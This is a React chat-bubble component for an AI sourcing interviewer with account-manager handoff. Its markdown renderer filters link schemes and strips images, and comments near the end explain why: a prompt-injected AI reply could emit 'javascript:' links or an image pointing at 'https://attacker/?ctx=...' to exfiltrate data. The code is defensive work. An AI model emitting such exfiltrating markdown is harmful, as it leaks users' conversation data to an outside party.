"use client";

import { motion } from "framer-motion";
import { CheckCheck, RotateCw, UserRound } from "lucide-react";
import ReactMarkdown from "react-markdown";
import remarkGfm from "remark-gfm";
import { cn } from "@/lib/utils";
import type { Message } from "@/types/chat";
import { ProfileSummaryCard } from "./ProfileSummaryCard";

interface MessageBubbleProps {
  message: Message;
  // True once the buyer has clicked Request human review (sticky for the
  // rest of the session). Swaps the CTA on the profile card for the
  // "Transferring…" badge.
  reviewRequested?: boolean;
  // True while the request_review POST is in flight — shows a spinner on
  // the CTA. Parent owns the loading flag because it owns the fetch.
  reviewSubmitting?: boolean;
  onRequestReview?: () => void;
  // Called when the user clicks Retry on an error bubble. Re-sends the
  // last user message via the chat hook.
  onRetry?: () => void;
  // Disables the retry button while a request is in flight.
  retryDisabled?: boolean;
  // Whose perspective are we rendering for? Default "buyer" — buyer
  // messages align right (self), AM/AI on the left (incoming). On the
  // AM dashboard, pass "account_manager" so AM messages flip to the
  // right and buyer messages render on the left. Drives alignment +
  // bubble styling only — content + attribution labels stay the same.
  viewerRole?: "buyer" | "account_manager";
  // Buyer's currently-selected session language. When this matches a
  // message's translatedTo we render translatedContent as the primary
  // text and the English original as a muted secondary line. Ignored
  // for account_manager viewers (AM always sees the English original).
  sessionLanguage?: string;
  // Quick-reply pill click handler. Only wired for the buyer viewer on
  // the latest agent message — parent decides which bubble is "latest"
  // and only passes the handler there. Sends the pill's text as a
  // regular user message.
  onSuggestion?: (text: string) => void;
}

export function MessageBubble({
  message,
  reviewRequested = false,
  reviewSubmitting = false,
  onRequestReview,
  onRetry,
  retryDisabled,
  viewerRole = "buyer",
  sessionLanguage = "en",
  onSuggestion,
}: MessageBubbleProps) {
  if (message.role === "divider") {
    return <Divider label={message.content} />;
  }

  const isAccountManager = message.from === "account_manager";
  // "self" = the sender we should align right (with the dark bubble).
  const isSelf =
    viewerRole === "buyer"
      ? message.role === "user"
      : isAccountManager;
  // Keep the existing variable name to minimise downstream churn — the
  // semantics are now "render as outgoing/self bubble".
  const isUser = isSelf;

  // Honour translation only on the buyer's side and only when the
  // translation was produced for the language they currently have
  // selected. If they switched mid-session, translatedTo on older
  // messages won't match and we fall back to the English original.
  const showTranslation =
    viewerRole === "buyer" &&
    isAccountManager &&
    !!message.translatedContent &&
    !!message.translatedTo &&
    message.translatedTo === sessionLanguage &&
    sessionLanguage !== "en";
  const primaryText = showTranslation
    ? (message.translatedContent as string)
    : message.content;
  return (
    <motion.div
      initial={{ opacity: 0, y: 6 }}
      animate={{ opacity: 1, y: 0 }}
      transition={{ duration: 0.35, ease: [0.22, 1, 0.36, 1] }}
      className={cn("flex", isUser ? "justify-end" : "justify-start")}
    >
      <div
        className={cn(
          "flex max-w-[88%] flex-col gap-3",
          isUser ? "items-end" : "items-start",
        )}
      >
        {isAccountManager && viewerRole === "buyer" && (
          <div className="flex items-center gap-1.5 px-1 text-[11px] font-medium text-gray-500">
            <span className="inline-flex h-4 w-4 items-center justify-center rounded-full bg-[#0F2747] text-white">
              <UserRound className="h-2.5 w-2.5" strokeWidth={2.25} />
            </span>
            Account manager
          </div>
        )}
        {message.content && (
          <div
            className={cn(
              "rounded-2xl px-4 py-3 text-[15px] leading-relaxed",
              isUser
                ? "bg-[#0F2747] text-white whitespace-pre-wrap"
                : message.error
                  ? "bg-white border border-red-200 text-red-900 shadow-[0_1px_2px_rgba(0,0,0,0.03)]"
                  : "bg-white border border-gray-200 text-gray-900 shadow-[0_1px_2px_rgba(0,0,0,0.03)]",
            )}
          >
            {isUser ? (
              message.content
            ) : message.error ? (
              <div>
                <div>{message.content}</div>
                {onRetry && (
                  <button
                    type="button"
                    onClick={onRetry}
                    disabled={retryDisabled}
                    className="mt-2 inline-flex items-center gap-1.5 rounded-full border border-red-200 bg-white px-3 py-1 text-xs font-medium text-red-700 transition-colors hover:bg-red-50 disabled:opacity-50 disabled:cursor-not-allowed"
                  >
                    <RotateCw className="h-3 w-3" strokeWidth={2} />
                    Retry
                  </button>
                )}
              </div>
            ) : (
              <>
                <AgentMarkdown content={primaryText} />
                {showTranslation && (
                  <>
                    <hr className="my-2.5 border-gray-100" />
                    <div className="text-[12px] leading-relaxed text-gray-400">
                      <div className="mb-1 text-[10px] font-semibold uppercase tracking-wider text-gray-300">
                        Original
                      </div>
                      <AgentMarkdown content={message.content} />
                    </div>
                  </>
                )}
              </>
            )}
          </div>
        )}

        {message.profileCard && (
          <ProfileSummaryCard
            profile={message.profileCard}
            reviewRequested={reviewRequested}
            reviewSubmitting={reviewSubmitting}
            onRequestReview={onRequestReview}
          />
        )}

        {/* Quick-reply pills — only rendered when the parent passes an
            onSuggestion handler (which it only does for the latest
            agent message). Clicking sends the pill text as a regular
            user message. */}
        {!isUser &&
          !isAccountManager &&
          !message.error &&
          onSuggestion &&
          message.suggestions &&
          message.suggestions.length > 0 && (
            <div className="flex flex-wrap gap-2 pt-1">
              {message.suggestions.map((s) => (
                <button
                  key={s}
                  type="button"
                  onClick={() => onSuggestion(s)}
                  className="rounded-full border border-gray-200 bg-white px-3.5 py-1.5 text-[13px] text-gray-700 shadow-[0_1px_2px_rgba(0,0,0,0.03)] transition-all duration-150 hover:border-gray-300 hover:bg-gray-50 hover:text-gray-900 active:translate-y-px"
                >
                  {s}
                </button>
              ))}
            </div>
          )}

        {/* Read receipt under outgoing messages only — incoming bubbles
            don't need to tell the sender "I've read this". */}
        {isSelf && message.readAt && !message.error && (
          <div className="inline-flex items-center gap-1 px-1 text-[10px] font-medium text-gray-400">
            <CheckCheck className="h-3 w-3" strokeWidth={2} />
            Read
          </div>
        )}
      </div>
    </motion.div>
  );
}


function AgentMarkdown({ content }: { content: string }) {
  return (
    <ReactMarkdown
      remarkPlugins={[remarkGfm]}
      components={{
        p: ({ children }) => (
          <p className="mb-2 last:mb-0">{children}</p>
        ),
        ul: ({ children }) => (
          <ul className="my-2 ml-4 list-disc space-y-1">{children}</ul>
        ),
        ol: ({ children }) => (
          <ol className="my-2 ml-5 list-decimal space-y-1">{children}</ol>
        ),
        li: ({ children }) => <li className="pl-1">{children}</li>,
        strong: ({ children }) => (
          <strong className="font-semibold text-gray-900">{children}</strong>
        ),
        em: ({ children }) => <em className="italic">{children}</em>,
        a: ({ href, children }) => {
          // Only render http(s) / mailto links. Drops javascript:, data:,
          // and any other scheme that could exfiltrate or execute. Defends
          // against prompt-injected AI replies emitting malicious anchors.
          const safe =
            typeof href === "string" &&
            /^(https?:|mailto:)/i.test(href.trim());
          if (!safe) return <>{children}</>;
          return (
            <a
              href={href}
              target="_blank"
              rel="noopener noreferrer"
              className="text-[#0F2747] underline underline-offset-2 hover:text-[#1D4ED8] transition-colors"
            >
              {children}
            </a>
          );
        },
        // Images are stripped: the AI is a text interviewer and has no
        // legitimate reason to send images. Without this, a prompt-injected
        // reply could embed ![](https://attacker/?ctx=...) and silently
        // exfiltrate data via the browser's automatic image fetch.
        img: () => null,
        code: ({ children }) => (
          <code className="rounded bg-gray-100 px-1.5 py-0.5 font-mono text-[0.85em] text-gray-800">
            {children}
          </code>
        ),
        pre: ({ children }) => (
          <pre className="my-2 overflow-x-auto rounded-lg bg-gray-100 p-3 font-mono text-[13px] text-gray-800">
            {children}
          </pre>
        ),
        h1: ({ children }) => (
          <h1 className="mt-3 mb-2 text-base font-semibold text-gray-900">
            {children}
          </h1>
        ),
        h2: ({ children }) => (
          <h2 className="mt-3 mb-2 text-base font-semibold text-gray-900">
            {children}
          </h2>
        ),
        h3: ({ children }) => (
          <h3 className="mt-2 mb-1 text-[15px] font-semibold text-gray-900">
            {children}
          </h3>
        ),
        hr: () => <hr className="my-3 border-gray-200" />,
        blockquote: ({ children }) => (
          <blockquote className="my-2 border-l-2 border-gray-300 pl-3 italic text-gray-700">
            {children}
          </blockquote>
        ),
      }}
    >
      {content}
    </ReactMarkdown>
  );
}


// Full-width separator marking the switch from the AI sourcing
// conversation to the account-manager conversation after handoff. Sits
// outside the bubble layout so it doesn't pick up the user/agent
// alignment styles.
function Divider({ label }: { label: string }) {
  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      transition={{ duration: 0.3 }}
      className="flex items-center gap-3 py-2"
      role="separator"
      aria-label={label}
    >
      <span className="h-px flex-1 bg-gray-200" />
      <span className="text-[10px] font-semibold uppercase tracking-wider text-gray-400">
        {label}
      </span>
      <span className="h-px flex-1 bg-gray-200" />
    </motion.div>
  );
}


export function TypingIndicator() {
  return (
    <motion.div
      initial={{ opacity: 0 }}
      animate={{ opacity: 1 }}
      transition={{ duration: 0.2 }}
      className="flex justify-start"
    >
      <div className="rounded-2xl border border-gray-200 bg-white px-4 py-3 shadow-[0_1px_2px_rgba(0,0,0,0.03)]">
        <span className="inline-flex items-end gap-1">
          {[0, 0.15, 0.3].map((d) => (
            <span
              key={d}
              className="h-1.5 w-1.5 animate-bounce rounded-full bg-gray-400"
              style={{ animationDelay: `${d}s` }}
            />
          ))}
        </span>
      </div>
    </motion.div>
  );
}
